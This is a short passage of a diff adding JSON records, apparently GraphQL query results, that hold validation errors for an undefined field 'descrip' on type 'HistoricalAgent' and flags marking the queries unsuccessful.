+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/descrip]) : Field 'descrip' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
